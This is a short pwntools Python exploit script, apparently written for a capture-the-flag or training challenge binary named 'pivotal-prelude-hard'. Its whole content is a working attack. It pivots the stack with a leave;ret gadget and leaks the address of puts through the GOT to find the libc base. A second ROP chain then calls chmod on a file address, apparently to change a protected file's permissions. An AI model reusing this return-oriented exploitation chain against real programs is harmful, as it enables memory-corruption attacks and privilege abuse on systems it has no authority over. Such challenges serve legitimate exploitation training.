from pwn import *
context(os='linux', arch='amd64', log_level='debug')
libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
main_addr=0x4010F0
pop_rbp_ret=0x4011BD
leave_ret=0x402178
pop_rdi_ret=0x4022A3
pop_rdi_ret_in_libc=0x23b6a
pop_rsi_ret_in_libc=0x2601f
puts_got=0x405020
puts_plt=0x4010A0
puts=0x84420
chmod=0x10dd80
system=0x52290
buflen=40
file_addr=0x4004E8


p=process("/challenge/pivotal-prelude-hard")
elf=ELF("/challenge/pivotal-prelude-hard")
buf_addr=elf.bss()+0x10018
print("[Leak]:buf_addr=",hex(buf_addr))

payload1=p64(pop_rbp_ret)+p64(buf_addr+24)+p64(leave_ret)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.send(payload1)
p.recvuntil("Leaving!\n",drop=True)
puts_addr=u64(p.recvuntil("\n",drop=True).ljust(8,b'\x00'))
print("[Leak]:puts_addr=",hex(puts_addr))
libc_base=puts_addr-puts
chmod_addr=chmod+libc_base

payload2=p64(pop_rbp_ret)+p64(buf_addr+24)+p64(leave_ret)+p64(pop_rdi_ret_in_libc+libc_base)+p64(file_addr)+p64(pop_rsi_ret_in_libc+libc_base)+p64(4)+p64(chmod_addr)
p.send(payload2)
print(p.recvall())
p.interactive()
